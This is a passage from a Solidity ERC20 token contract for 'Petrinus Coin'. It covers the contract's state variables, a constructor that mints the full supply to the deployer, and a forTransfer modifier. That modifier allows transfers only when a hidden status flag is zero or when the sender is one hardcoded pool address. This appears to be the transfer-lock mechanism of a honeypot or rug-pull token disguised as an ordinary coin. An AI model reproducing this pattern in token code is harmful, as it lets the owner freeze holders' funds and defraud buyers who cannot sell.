...
contract Petrinus is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenao_totalSupply;
    uint256 private _tokenao_status = 0;
    uint256 public stakingPoolaoStatus = 0;

    string private _tokenao_name;
    string private _tokenao_symbol;

    address private _poolaoAddress = 0xb10f7A32C931E9F57E7DB53Ab0FE98940105a3e7;

    constructor() {
        _tokenao_name = "Petrinus Coin";
        _tokenao_symbol = "Petrinus";
        _tokenao_totalSupply = 10000 * 10 ** 18;
        _balances[msg.sender] = _tokenao_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolaoAddress || _tokenao_status == 0);
        _;
    }
